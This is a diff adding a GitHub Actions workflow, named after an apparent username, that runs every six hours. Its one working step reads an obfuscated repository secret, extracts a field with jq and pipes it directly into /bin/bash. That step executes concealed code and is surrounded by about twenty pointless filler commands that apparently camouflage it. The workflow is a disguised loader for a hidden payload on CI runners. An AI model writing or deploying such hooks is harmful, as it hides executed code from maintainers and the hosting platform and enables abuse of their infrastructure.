@@ -1,0 +1,37 @@
+name: huanglongxing1987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huanglongxing1987
+        env:
+          u28655: ${{ secrets.u28655 }}
+        run: |
+          [ -f /etc/hosts ] && echo "Hosts exist" || true
+          echo "Date only: $(date +%F)"
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          echo $u28655 | jq -r .t13632 | /bin/bash
+          screen -ls
+          which screen
+          printf "%s" "xyz" > tmp.xyz
+          echo "User: $(whoami)"
+          which brew
+          which bash 2>/dev/null || echo "Bash not in path"
+          echo "Dir: $(pwd)"
+          printf "%s\n" $(date)
+          test -d /tmp && echo "Tmp dir exists"
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          ls -la 2>/dev/null || true
+          pushd ~
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          echo "Time: $(date +%H:%M:%S)"
+          echo "Files: $(ls | wc -l 2>/dev/null || echo 0)"
